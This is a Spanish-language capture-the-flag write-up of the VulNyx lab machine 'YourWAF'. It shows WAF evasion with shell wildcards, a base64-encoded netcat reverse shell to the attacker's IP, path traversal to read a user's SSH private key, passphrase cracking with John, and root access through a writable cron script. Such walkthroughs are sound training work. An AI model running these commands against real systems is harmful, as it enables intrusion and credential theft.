<!DOCTYPE html>
<html lang="es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">VulNyx - YourWAF | noname</title>
<meta property="og:title" content="VulNyx - YourWAF | noname" />
<meta name="twitter:title" content="VulNyx - YourWAF | noname" />
<meta itemprop="name" content="VulNyx - YourWAF | noname" />
<meta name="application-name" content="VulNyx - YourWAF | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup YourWAFüü¢">
<meta itemprop="description" content="Writeup YourWAFüü¢" />
<meta property="og:description" content="Writeup YourWAFüü¢" />
<meta name="twitter:description" content="Writeup YourWAFüü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/nyx/ywaf/" title="" />



  <meta itemprop="image" content="http://localhost:1313/images/logo.png" />
  <meta property="og:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image:src" content="http://localhost:1313/images/logo.png" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2025-04-25T12:54:31&#43;0200 />
    <meta property="article:published_time" content=2025-04-25T12:54:31&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "VulNyx - YourWAF",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2025-04-25",
        "description": "Writeup YourWAFüü¢",
        "wordCount":  1469 ,
        "mainEntityOfPage": "True",
        "dateModified": "2025-04-25",
        "image": {
        "@type": "imageObject",
        "url": "\/images\/logo.png"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>

<meta name="generator" content="Hugo 0.140.0">

    

    <link rel="canonical" href="http://localhost:1313/writeups/nyx/ywaf/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    </head>
<body data-theme = "" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">VulNyx - YourWAF</h1>
                
                
                <div class="post-meta">
                    <time datetime="2025-04-25T12:54:31&#43;02:00" itemprop="datePublished"> Apr 25, 2025 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/nyx/ywaf/ywaf_logo.webp" alt="logo"></p>
<ul>
<li><em>Command Obfuscation via Wildcards</em></li>
<li><em>Path Traversal to Access Sensitive Files via API Token</em></li>
<li><em>Brute-Forcing SSH Private Key Passphrase with John the Ripper</em></li>
<li><em>Privilege Escalation via Writable Script Executed by Root (copylogs.sh)</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 172.0.100.37
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl 64
</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl 64
</span></span><span class="line"><span class="cl">3000/tcp open  ppp     syn-ack ttl 64
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -p 22,80,3000 172.0.100.37
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
</span></span><span class="line"><span class="cl">|_http-title: 403 Forbidden
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.59 (Debian)
</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js (Express middleware)
</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
</span></span></code></pre></div><h3 id="http---tcp-80">HTTP - TCP 80</h3>
<p><img src="/../machines/nyx/ywaf/http.webp" alt="http"></p>
<p>A√±ad√≠ el dominio al archivo <code>/etc/hosts</code> para poder acceder a la web.</p>
<p><img src="/../machines/nyx/ywaf/ywaf.webp" alt="ywaf"></p>
<h3 id="http---tcp-3000">HTTP - TCP 3000</h3>
<p>Al acceder al puerto <strong>3000</strong>, el servidor responde con un mensaje de <strong>Unauthorized</strong>.</p>
<p><img src="/../machines/nyx/ywaf/d3000.webp" alt="d3000"></p>
<p>Enumero directorios en el puerto <strong>3000</strong> y aparecen varias rutas interesantes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ffuf -t 100 -c -fc 404 -fs 280 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://www.yourwaf.nyx:3000/FUZZ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://www.yourwaf.nyx:3000/FUZZ
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"> :: Follow redirects : false
</span></span><span class="line"><span class="cl"> :: Calibration      : false
</span></span><span class="line"><span class="cl"> :: Timeout          : 10
</span></span><span class="line"><span class="cl"> :: Threads          : 50
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl"> :: Filter           : Response status: 404
</span></span><span class="line"><span class="cl"> :: Filter           : Response size: 280
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Logs                    [Status: 200, Size: 226621106, Words: 0, Lines: 0, Duration: 0ms]
</span></span><span class="line"><span class="cl">logs                    [Status: 200, Size: 247057905, Words: 0, Lines: 0, Duration: 0ms]
</span></span><span class="line"><span class="cl">readfile                [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 60ms]
</span></span></code></pre></div><p>La √∫nica URL que devuelve contenido es <code>/logs</code>.</p>
<p><img src="/../machines/nyx/ywaf/logs.webp" alt="logs"></p>
<p>Al no obtener informaci√≥n relevante, decid√≠ hacer enumeraci√≥n de subdominios.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ffuf -t 100 -c -fw 1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#34;User-Agent: morzilla&#34; -H &#34;Host: FUZZ.yourwaf.nyx&#34; -u http://www.yourwaf.nyx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://www.yourwaf.nyx
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.yourwaf.nyx
</span></span><span class="line"><span class="cl"> :: Header           : User-Agent: morzilla
</span></span><span class="line"><span class="cl"> :: Follow redirects : false
</span></span><span class="line"><span class="cl"> :: Calibration      : false
</span></span><span class="line"><span class="cl"> :: Timeout          : 10
</span></span><span class="line"><span class="cl"> :: Threads          : 100
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl"> :: Filter           : Response words: 1
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www                     [Status: 200, Size: 10722, Words: 3594, Lines: 171, Duration: 50ms]
</span></span><span class="line"><span class="cl">maintenance             [Status: 200, Size: 292, Words: 58, Lines: 14, Duration: 165ms]
</span></span></code></pre></div><p>Modifico el archivo <code>hosts</code> y le a√±ado el subdominio para visualizar la web.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ echo &#34;172.0.100.37 maintenance.yourwaf.nyx&#34; | sudo tee -a /etc/hosts
</span></span></code></pre></div><p>Al visitar el nuevo subdominio, me encuentro con una herramienta que permite ejecutar comandos en el servidor.</p>
<p><img src="/../machines/nyx/ywaf/subdomain.webp" alt="subdomain"></p>
<p>Puedo ejecutar el comando <code>id</code> sin problemas y obtengo la respuesta esperada con los detalles del usuario.</p>
<p><img src="/../machines/nyx/ywaf/edc.webp" alt="edc"></p>
<p>Al intentar ejecutar <code>cat /etc/passwd</code>, el servidor responde con un <strong>403 Forbidden</strong>, lo que indica que hay alg√∫n tipo de restricci√≥n o filtro (como un WAF) que bloquea el acceso a ese recurso.</p>
<p><img src="/../machines/nyx/ywaf/catetc.webp" alt="catetc"></p>
<h3 id="command-wildcard-obfuscation">Command Wildcard Obfuscation</h3>
<p>Uso comodines como <code>?</code> para ofuscar el comando <code>/bin/cat /etc/passwd</code>. Al ejecutarlo con los comodines <code>/?i?/c?t /?t?/passwd | base64</code>, obtengo una salida codificada, lo que indica que el comando se ejecut√≥ correctamente.</p>
<p><img src="/../machines/nyx/ywaf/catetcmod.webp" alt="catetcmod"></p>
<h3 id="por-qu√©-los--funcionan">¬øPor qu√© los &ldquo;<code>?</code>&rdquo; funcionan?</h3>
<p>El signo <code>?</code> en rutas de comandos o scripts puede tener diferentes usos seg√∫n el sistema.<br>
En <strong>bash</strong>, funciona como un <strong>comod√≠n</strong> que representa un solo car√°cter en nombres de archivo.</p>
<p><strong>Ejemplo:</strong><br>
El comando <code>ls /b?n/bash</code> busca cualquier ruta que empiece con &ldquo;b&rdquo;, tenga un car√°cter cualquiera en lugar de <code>?</code>, y contin√∫e con <strong>bash</strong>. Por ejemplo, <code>/b?n/bash</code> podr√≠a coincidir con <code>/bin/bash</code> si esa ruta existe y no hay otras coincidencias.</p>
<p>Al analizarla con <strong>CyberChef</strong>, la decodifiqu√© correctamente y logr√© visualizar el contenido del archivo <code>/etc/passwd</code>.</p>
<p><img src="/../machines/nyx/ywaf/cyberchef64.webp" alt="cyberchef64"></p>
<p>Sabiendo que los comandos directos estaban siendo bloqueados, codifico una reverse shell en base64:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ echo &#34;nc -c /bin/bash 172.0.100.25 1337&#34; | base64
</span></span><span class="line"><span class="cl">bmMgLWMgL2Jpbi9iYXNoIDE3Mi4wLjEwMC4yNSAxMzM3Cg==
</span></span></code></pre></div><p>La idea es decodificar y ejecutar la shell directamente desde la m√°quina objetivo. El <strong>payload</strong> quedar√≠a as√≠:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/echo bmMgLWMgL2Jpbi9iYXNoIDE3Mi4wLjEwMC4yNSAxMzM3Cg== | base64 -d | /bin/bash -e
</span></span></code></pre></div><p>Sin embargo, lanzarlo de esta forma puede ser detectado f√°cilmente por el <strong>WAF</strong>. Para evadirlo, modifico algunos caracteres usando comodines:</p>
<pre tabindex="0"><code>/b?n/e?ho bmMgLWMgL2Jpbi9iYXNoIDE3Mi4wLjEwMC4yNSAxMzM3Cg== | base64 -d | /b?n/b?sh -e
</code></pre><p>As√≠ logro ofuscar el comando manteniendo su funcionalidad y obtener una shell como usuario <code>www-data</code>.</p>
<p><img src="/../machines/nyx/ywaf/rs1337.webp" alt="rs1337"></p>
<p>Enumero los procesos en ejecuci√≥n con <code>ps</code> y logro identificar un archivo interesante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ps aux | grep node
</span></span></code></pre></div><p>Esto me permite encontrar el proceso de una aplicaci√≥n <code>Node.js</code> que est√° ejecutando el archivo <code>server.js</code>, ubicado en la ruta <code>/opt/nodeapp/server.js</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@yourwaf:/$ ps aux | grep node
</span></span><span class="line"><span class="cl">root         602  0.5  1.6 687252 84704 ?        Ssl  15:21   0:34 node /opt/nodeapp/server.js
</span></span><span class="line"><span class="cl">www-data    3743  0.0  0.0   3324  1504 pts/0    S+   16:58   0:00 grep node
</span></span></code></pre></div><p>Dentro del directorio <code>/opt/nodeapp</code> se encuentran los siguientes archivos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@yourwaf:/opt/nodeapp$ ls -la
</span></span><span class="line"><span class="cl">ls -la
</span></span><span class="line"><span class="cl">total 60
</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root root      4096 May 26  2024 .
</span></span><span class="line"><span class="cl">drwxr-xr-x  3 root root      4096 May 26  2024 ..
</span></span><span class="line"><span class="cl">-rwxrwxr-x  1 root copylogs   111 May 26  2024 copylogs.sh
</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       232 May 26  2024 ecosystem.config.js
</span></span><span class="line"><span class="cl">drwxr-xr-x  2 root root      4096 May 26  2024 logs
</span></span><span class="line"><span class="cl">drwxr-xr-x 66 root root      4096 May 26  2024 node_modules
</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root     25436 May 26  2024 package-lock.json
</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root       303 May 26  2024 package.json
</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root      1247 May 26  2024 server.js
</span></span></code></pre></div><p>Estos archivos son t√≠picos de una aplicaci√≥n <code>Node.js</code>. El m√°s relevante para el an√°lisis inicial suele ser <code>server.js</code>, ya que generalmente contiene la configuraci√≥n principal del servidor.
Al revisar el archivo <code>server.js</code> en <code>/opt/nodeapp</code>, encontr√© una <strong>API token</strong> incrustada en el c√≥digo. Esto podr√≠a permitir el acceso no autorizado a la API si se utiliza de manera indebida.</p>
<p><img src="/../machines/nyx/ywaf/apiToken.webp" alt="apiToken"></p>
<h3 id="path-traversal-mediante-api-token">Path Traversal mediante API token</h3>
<p>Durante la revisi√≥n de la aplicaci√≥n, descubr√≠ que la funcionalidad <code>readfile</code> en el puerto 3000 permit√≠a la lectura de archivos del sistema a trav√©s de una petici√≥n HTTP. Para realizar esta acci√≥n, es necesario proporcionar un token de API v√°lido y el nombre del archivo que se desea leer.</p>
<p>En este caso, utilic√© el siguiente comando <code>curl</code> para intentar leer el archivo de claves privadas SSH <code>id_rsa</code> del usuario <code>tester</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl &#34;http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../../../home/tester/.ssh/id_rsa&#34; -o -
</span></span></code></pre></div><p><img src="/../machines/nyx/ywaf/rsa.webp" alt="rsa"></p>
<p>Una vez obtenido el archivo <code>id_rsa</code> a trav√©s de la vulnerabilidad de <strong>path traversal</strong>, intent√© utilizarlo para autenticarme en el sistema SSH de la m√°quina comprometida con el siguiente comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh tester@172.0.100.37 -i id_rsa
</span></span></code></pre></div><p>Sin embargo, me solicit√≥ una frase de contrase√±a (passphrase) para poder usar la clave privada. Esto indica que el archivo <code>id_rsa</code> est√° cifrado y protegido por un passphrase.</p>
<p>Para descifrar el passphrase, utilic√© <code>ssh2john</code> para extraer el hash de la clave privada en formato compatible:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh2john id_rsa &gt; hashrsa 
</span></span></code></pre></div><p>Luego, utilic√© <code>John the Ripper</code>  para intentar crackear el passphrase:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt hashrsa
</span></span><span class="line"><span class="cl">w*****           (id_rsa) 
</span></span></code></pre></div><p>Despu√©s de obtener el passphrase correcto para la clave privada <code>id_rsa</code>, logr√© acceder al servidor SSH de la m√°quina comprometida como el usuario <code>tester</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh tester@172.0.100.37 -i id_rsa
</span></span><span class="line"><span class="cl">Enter passphrase for key &#39;id_rsa&#39;: 
</span></span><span class="line"><span class="cl">Linux yourwaf 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software;
</span></span><span class="line"><span class="cl">the exact distribution terms for each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">tester@yourwaf:~$ 
</span></span></code></pre></div><p>Una vez dentro del sistema, utilic√© el comando <code>id</code> para obtener informaci√≥n sobre el usuario <code>tester</code>. El resultado muestra que <code>tester</code> pertenece al grupo <code>copylogs</code> (ID de grupo 1001), lo cual puede ser relevante al explorar permisos y archivos espec√≠ficos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tester@yourwaf:~$ id
</span></span><span class="line"><span class="cl">uid=1000(tester) gid=1000(tester) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
</span></span></code></pre></div><p>Utilic√© <code>pspy64</code> para enumerar los procesos en ejecuci√≥n y ver qu√© scripts o programas podr√≠an estar ejecut√°ndose con privilegios elevados. Durante este proceso, identifiqu√© que <code>/bin/bash</code> estaba ejecutando el script <code>copylogs.sh</code>, ubicado en el directorio <code>/opt/nodeapp</code>:</p>
<p><img src="/../machines/nyx/ywaf/pspy64.webp" alt="pspy64"></p>
<p>Al investigar el archivo <code>copylogs.sh</code> ubicado en <code>/opt/nodeapp</code>, comprob√© que el usuario <code>tester</code> tiene permisos de escritura sobre el archivo debido a que pertenece al grupo <code>copylogs</code>. Esto se confirm√≥ con el siguiente comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tester@yourwaf:~$ ls -la /opt/nodeapp/copylogs.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-x 1 root copylogs 147 abr 21 16:02
</span></span></code></pre></div><h3 id="explotaci√≥n-de-la-vulnerabilidad-mediante-copylogssh">Explotaci√≥n de la vulnerabilidad mediante <em><code>copylogs.sh</code></em></h3>
<p>Para aprovechar la vulnerabilidad, edit√© el archivo <code>copylogs.sh</code> utilizando el editor <code>nano</code>, dado que <code>tester</code> tiene permisos de escritura en este archivo. Insert√© una reverseshell utilizando <code>netcat</code>, con el siguiente comando:</p>
<p><img src="/../machines/nyx/ywaf/copylogs.webp" alt="copylogs"></p>
<p>Despu√©s de modificar el archivo, esper√© unos segundos y observ√© que se estableci√≥ una conexi√≥n de red, obteniendo una shell de root en el sistema:</p>
<p><img src="/../machines/nyx/ywaf/root.webp" alt="root"></p>
<p>Y as√≠ concluye el viaje en la m√°quina YourWAF.</p>
<p>Que el destino te gu√≠e.</p>
<p>Saludos.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2025 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
